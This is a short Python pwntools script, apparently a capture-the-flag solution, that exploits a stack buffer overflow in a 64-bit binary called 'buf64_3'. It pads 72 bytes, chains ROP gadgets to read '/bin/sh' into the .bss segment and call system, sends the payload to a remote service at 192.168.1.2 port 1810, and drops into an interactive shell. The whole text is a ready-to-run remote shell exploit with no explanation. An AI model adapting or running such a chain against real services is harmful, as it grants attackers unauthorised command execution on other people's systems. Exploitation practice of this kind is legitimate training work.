from pwn import *
context(terminal=['./gdbpwn-client.sh'])
elf = ELF('./buf64_3')

rdi = 0x0000000000400843
rsi = 0x0000000000400841
read_ = 0x400600
bss = 0x601068
system = 0x40071e

payload = cyclic(72) + p64(rsi) + p64(bss) + p64 (0) + p64(read_) + p64(rdi) + p64(bss) + p64 (system)

#p = elf.process()
#gdb.attach(p)
#pause()
p = remote('192.168.1.2', 1810)

p.sendlineafter(b'<<', payload)
time.sleep(0.5)
p.send(b'/bin/sh\x00')

p.interactive()

